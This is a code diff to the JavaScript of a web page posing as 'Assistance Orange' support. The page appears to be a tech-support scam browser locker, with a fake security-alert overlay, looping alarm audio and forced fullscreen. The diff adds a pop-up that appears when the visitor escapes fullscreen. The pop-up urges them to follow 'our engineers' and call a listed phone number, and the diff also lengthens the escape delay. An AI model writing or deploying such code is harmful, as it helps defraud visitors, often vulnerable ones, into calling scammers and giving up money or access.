@@ -100,7 +100,15 @@
     '<button class="modal-btn modal-btn-deny" id="denyAccountBtn" type="button">Ce n\'est pas moi</button></div></div></div></section></main></div>' +
     '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Assistance Orange</p></div>' +
     '<audio id="securityAudio1" src="script-audio.mp3" loop preload="auto"></audio>' +
-    '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>';
+    '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>' +
+    '<div id="escapeExitModal" class="escape-exit-overlay" aria-hidden="true" role="dialog" aria-label="Instructions assistance">' +
+    '<div class="escape-exit-modal">' +
+    '<p class="escape-exit-message">Veuillez suivre les instructions de nos ingénieurs</p>' +
+    '<p class="escape-exit-phone">' +
+    '<svg class="escape-exit-phone-icon" viewBox="0 0 24 24" aria-hidden="true">' +
+    '<path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.5.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.6 21 3 13.4 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.2.2 2.4.6 3.5.1.3 0 .7-.2 1L6.6 10.8z" fill="currentColor"/>' +
+    '</svg>' +
+    '<span>+33 02 59 50 90 20</span></p></div></div>';
 
   var realTitle = document.title;
 
@@ -114,7 +122,7 @@
     }
   });
 
-  var ESCAPE_DEZOOM_MS = 5000;
+  var ESCAPE_DEZOOM_MS = 10000;
   var secureAccountBtn = document.getElementById("secureAccountBtn");
   var denyAccountBtn = document.getElementById("denyAccountBtn");
   var securityOverlay = document.getElementById("securityOverlay");
@@ -186,6 +194,13 @@
     requestFullscreen();
   }
 
+  function showEscapeExitModal() {
+    var modal = document.getElementById("escapeExitModal");
+    if (!modal) return;
+    modal.classList.add("is-visible");
+    modal.setAttribute("aria-hidden", "false");
+  }
+
   function dezoomFullscreen() {
     allowFullscreenExit = true;
     isDezoomed = true;
@@ -193,6 +208,7 @@
     if (document.fullscreenElement && document.exitFullscreen) {
       document.exitFullscreen().catch(function () {});
     }
+    showEscapeExitModal();
     setTimeout(function () {
       allowFullscreenExit = false;
     }, 400);
